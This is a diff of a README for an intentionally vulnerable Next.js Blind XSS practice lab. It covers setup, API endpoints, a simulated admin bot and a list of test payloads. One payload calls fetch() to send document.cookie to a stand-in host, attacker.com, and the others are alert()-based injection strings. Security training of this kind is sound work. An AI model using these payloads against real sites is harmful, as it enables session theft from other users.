@@ -1,91 +1,194 @@
-# BlindXSS Lab (Next.js + Serverless)
+# Blind XSS Practice Lab
 
-An intentionally vulnerable Blind XSS practice lab built on Next.js. It includes:
-- A single-page UI to submit payloads and contact messages
-- Serverless API routes that record activity
-- A serverless “bot” endpoint that scans recent reports (simulating an admin reading and triggering XSS)
+A deliberately vulnerable web application designed for practicing Blind XSS (Cross-Site Scripting) attacks in a safe, controlled environment.
 
-This repo is tuned for Vercel’s serverless platform (no local file writes; ephemeral in-memory store).
+## 🚨 Security Warning
 
-## Features
-- Next.js app (Pages Router)
-- Serverless APIs: `/api/reports`, `/api/comments`, `/api/contact`, `/api/collect-xss`, `/api/xss-payloads`
-- Admin bot endpoint: `/api/bot` (manual trigger or Vercel Cron)
-- No DB dependency in deployment: uses an in-memory store per warm lambda
+This application is intentionally vulnerable and should only be used for educational purposes in a secure, isolated environment. Do not deploy this application in production or expose it to the internet without proper security controls.
 
-## Requirements
-- Node.js 18+ (Next.js 14)
-- npm 9+ or pnpm/yarn equivalent
+## 🎯 What is Blind XSS?
 
-## Quick Start (Local)
-1) Clone and install:
-   - `git clone https://github.com/3xecutablefile/BlindXSS-Lab.git`
-   - `cd BlindXSS-Lab`
-   - `npm install`
+Blind XSS is a type of Cross-Site Scripting attack where the malicious payload is stored and executed on a server-side application, often in admin panels or user management systems. Unlike regular XSS, the attacker doesn't immediately see the results - they must wait for an admin or privileged user to access the payload, which then sends data back to the attacker's server.
 
-2) Run dev server:
-   - `npm run dev`
-   - App runs at `http://localhost:3000`
+## 📋 Features
 
-3) Optional production build locally:
-   - `npm run build && npm start`
-   - Starts a production server on port 3000
+- **Vulnerable endpoints**: Multiple input points where XSS payloads can be injected
+- **Admin bot simulation**: A background process that "reads" stored reports, executing any XSS payloads
+- **Real-time feedback**: Immediate visibility of XSS payload execution
+- **Educational focus**: Clear warnings and explanations about security risks
 
-4) Try it:
-   - Open the homepage and submit an XSS payload (e.g. `<script>alert('XSS')</script>`)
-   - Submit a contact message to see your UA captured
-   - Trigger the bot manually: `curl http://localhost:3000/api/bot`
+## 🛠️ Technologies Used
 
-Notes for local dev:
-- Data is kept in memory and resets on server restart.
+- Next.js (Pages Router)
+- Node.js
+- In-memory storage system
+- Concurrent bot polling system
 
-## Deploy to Vercel (CLI)
-1) Install Vercel CLI:
-   - `npm i -g vercel`
+## 🚀 Quick Start
 
-2) Deploy:
-   - First time: `vercel` (link project and confirm)
-   - Production: `vercel --prod --yes`
+### Prerequisites
+- Node.js 18+ 
+- npm 9+ (or equivalent package manager)
 
-3) Make it public:
-   - In Vercel → Project → Settings → Deployment Protection → set Production to Public
+### Installation
+1. Clone the repository (or navigate to your existing project directory)
+2. Install dependencies:
+   ```bash
+   npm install
+   ```
 
-4) Optional (Cron):
-   - The included `vercel.json` schedules the bot once per day (Hobby plan limit):
-     - `GET /api/bot` at 00:00 UTC
-   - You can trigger manually anytime or use an external pinger for higher frequency.
+### Running the Application
+1. Start the development server with the bot:
+   ```bash
+   npm run dev
+   ```
+   The application will start at `http://localhost:3000` (or next available port if 3000 is taken)
 
-## Deploy via Dashboard
-1) Create a new Vercel Project and import this GitHub repo.
-2) Framework Preset: Next.js
-3) Root Directory: `/` (repo root)
-4) Build/Output: leave empty (Next.js defaults)
-5) After deploy, go to Settings → Deployment Protection and set Production to Public.
+2. The bot will automatically start polling for XSS payloads in the background
 
-## API Overview
-- `GET /api/reports` → list reports
-- `POST /api/reports` → `{ userAgent: string }` adds a report
-- `GET /api/comments` → list comments
-- `POST /api/comments` → `{ name, comment }` adds a comment
-- `POST /api/contact` → `{ name, email, message }` stores a contact message + UA
-- `GET|POST /api/collect-xss` → collects payload data (returns 1x1 GIF)
-- `GET /api/xss-payloads` → list collected payloads
-- `GET /api/bot` → scans last 5 minutes of reports and flags XSS-like payloads
-
-Example calls:
+### Production Build (Optional)
+For a production-like setup:
+```bash
+npm run build && npm start
 ```
+
+## 🎮 How to Practice Blind XSS
+
+### Method 1: User-Agent Payload
+1. Navigate to the main page
+2. Enter an XSS payload in the "Enter XSS Payload" field (e.g., `<img src=x onerror=alert('XSS')>`)
+3. Click "Submit Payload"
+4. The bot will automatically check new reports every few seconds
+5. When the bot "reads" your report, your payload will execute
+
+### Method 2: Contact Form
+1. Use the contact form on the page
+2. The form will capture your browser's User-Agent string
+3. If your User-Agent contains XSS code, it may be detected by the bot
+
+### Method 3: API Direct Access
+You can also submit payloads directly to the API:
+```bash
 curl -X POST http://localhost:3000/api/reports \
   -H 'Content-Type: application/json' \
   -d '{"userAgent":"<img src=x onerror=alert(1)>"}'
-
-curl http://localhost:3000/api/bot
 ```
 
-## Troubleshooting
-- 404 NOT_FOUND on Vercel: Attach your domain to the latest Production deployment (Settings → Domains), ensure Framework Preset is Next.js, Root Directory is `/`, and re-deploy.
-- 401 Authentication Required: Disable Deployment Protection (Settings → Deployment Protection → Production → Public) or use a bypass token.
-- Data disappears: The store is in-memory; it resets on cold starts/redeploys. For persistence, wire a managed DB (Vercel Postgres, Supabase, Turso).
+## 🔍 Available Endpoints
 
-## Security Notes
-- Intentionally vulnerable. Do not use with real data.
-- For educational purposes only.
+### Main Application Endpoints
+- `GET /` - Main application interface
+
+### API Endpoints
+- `GET /api/reports` - List all stored reports
+- `POST /api/reports` - Submit a new report with a User-Agent payload
+- `GET /api/comments` - List all comments  
+- `POST /api/comments` - Submit a new comment (potential XSS vector)
+- `POST /api/contact` - Submit a contact form (captures User-Agent)
+- `GET /api/xss-payloads` - List collected XSS payloads
+- `GET /api/bot` - Manually trigger the bot to scan for XSS payloads
+- `GET|POST /api/collect-xss` - Endpoint for collecting payload data (returns 1x1 GIF)
+
+## 🤖 Bot Behavior
+
+The application includes a "bot" that simulates an admin user reviewing reports. Every 3 seconds, the bot:
+
+1. Checks `/api/bot` endpoint for new reports
+2. Scans recent reports (past 5 minutes) for potential XSS payloads
+3. If XSS-like patterns are detected, they are flagged
+4. In a real scenario, the bot would execute the JavaScript code in a browser context
+
+## 🧪 Common XSS Payloads to Test
+
+> ⚠️ These are for educational purposes only!
+
+```html
+<!-- Basic alert -->
+<script>alert('XSS')</script>
+
+<!-- Image tag with onerror -->
+<img src=x onerror=alert('XSS')>
+
+<!-- JavaScript in href -->
+<a href="javascript:alert('XSS')">Click me</a>
+
+<!-- More stealthy -->
+<svg onload=alert('XSS')>
+
+<!-- Event handlers -->
+<div onmouseover=alert('XSS')>Hover over me</div>
+
+<!-- External payload -->
+<img src=x onerror=fetch('http://attacker.com/log?cookie='+document.cookie)>
+```
+
+## 🔧 Configuration Options
+
+You can customize the bot behavior using environment variables:
+
+- `BOT_URL` - Change the URL the bot polls (default: `http://localhost:3000/api/bot`)
+- `BOT_INTERVAL_MS` - Change polling interval (default: 3000ms)
+- `PORT` - Change the application port (default: 3000)
+
+Example:
+```bash
+BOT_INTERVAL_MS=5000 npm run dev
+```
+
+## 🐛 Troubleshooting
+
+### Common Issues
+
+**Port already in use**
+- Change default port: `PORT=3001 npm run dev`
+
+**No XSS execution observed**
+- Ensure your payload is correctly formed and can execute
+- Some browsers may block certain payloads due to built-in protections
+- Try different payload variations
+
+**Data disappears after restart**
+- The application uses in-memory storage that resets when the server stops
+- This is by design for security purposes
+
+**Bot error messages**
+- Minor bot errors may occur but shouldn't affect functionality
+- The bot is designed to continuously run and handle errors gracefully
+
+## 🏗️ Project Structure
+
+```
+├── pages/              # Next.js pages (UI and API routes)
+│   ├── index.js        # Main application page
+│   └── api/            # Server-side API routes
+├── lib/                # Helper functions
+│   └── memory-store.js # In-memory data storage
+├── scripts/            # Utility scripts
+│   └── bot.js          # Automated bot script
+├── package.json        # Project dependencies and scripts
+└── README.md           # This file
+```
+
+## 📚 Learning Objectives
+
+By using this application, you will learn:
+- How Blind XSS attacks work
+- Common XSS payload techniques
+- How to test for blind XSS vulnerabilities
+- The importance of input validation and output encoding
+- How administrators can be targeted through web applications
+
+## 🛡️ Security Considerations
+
+- This application should only be run in isolated, controlled environments
+- Never run this on a production server or expose to external networks
+- Data is stored in memory and not persisted to disk
+- The application is intentionally vulnerable - do not use as a security reference
+
+## 🙏 Credits
+
+This application was adapted from the original BlindXSS-Lab by 3xecutablefile.
+
+## 📝 License
+
+This project is for educational purposes only. Use responsibly.
